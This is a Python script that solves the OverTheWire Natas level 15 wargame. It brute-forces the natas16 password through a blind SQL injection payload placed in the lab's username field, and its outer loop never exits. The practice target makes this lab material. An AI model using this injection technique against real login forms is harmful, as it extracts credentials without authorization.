import requests
import string
# import re

userName = 'natas15'
url = f'http://{userName}.natas.labs.overthewire.org/'
pathDirectory = "C:\\Users\\niroj\\Documents\\Natas\\"
correct_password = open(pathDirectory + "password.txt", 'r').readlines()[14][8:40]


# -------------------------- First page ----------------------------

# response = requests.get(url, auth = (userName, password))
# htmlDoc = response.text
# # print(htmlDoc)

# try:
#     with open(pathDirectory + "scripts\\temp\\index.html", 'w') as htmlContent:
#         htmlContent.writelines(htmlDoc)
#         print("(+) first page is stored successfully on the path as index.html")
# except IOError as err:
#     print(f"(-) unfortunately {err}")

# # ---------------------------- source index file -------------------------------

# response = requests.get(url + 'index-source.html', auth = (userName, password))
# htmlDoc = response.text

# try:
#     with open(pathDirectory + "scripts\\temp\\index-source.html", 'w') as htmlSourceContent:
#         htmlSourceContent.writelines(htmlDoc)
#         print("(+) first page is stored successfully on the path as index-source.html")
# except IOError as err:
#     print(f"(-) unfortunately {err}")

# ----------------------------- Final page --------------------------------


allString = string.ascii_uppercase + string.ascii_lowercase + string.digits
print(allString)

natasPassword = list()

while (True):
    for character in allString:
        cast = "".join(natasPassword) + character
        print("Testing string:", cast)

        data = {
            'username': f'natas16" AND BINARY password LIKE  "{cast}%" #',
            'submit': 'Check existence',
        }
            # 'password': f'{cast}',
            # 'submit': 'Login'
        response = requests.post(url + 'index.php' , auth = (userName, correct_password), data = data)
        htmlDoc = response.text
        print(htmlDoc)

        try:
            with open(pathDirectory + "scripts\\temp\\result.html", 'w') as htmlFinalContent:
                htmlFinalContent.writelines(htmlDoc)
                print("(+) first page is stored successfully on the path as result.html")
        except IOError as err:
            print(f"(-) unfortunately {err}")

        if ('user exist' in htmlDoc):
            natasPassword.append(character)
            print()
            break
    
        if len(natasPassword) == 32:
            print("👌Done")
            break



# data = {
#     'username': f'natas16',
#     'submit': 'Check existence',
# }
#     # 'submit': 'Login'
# response = requests.post(url + 'index.php' , auth = (userName, password), data = data)
# htmlDoc = response.text
# try:
#     with open(pathDirectory + "scripts\\temp\\result.html", 'w') as htmlFinalContent:
#         htmlFinalContent.writelines(htmlDoc)
#         print("(+) first page is stored successfully on the path as result.html")
# except IOError as err:
#     print(f"(-) unfortunately {err}")


# solution = re.findall("natas15(.*)",htmlDoc)
# print(solution)
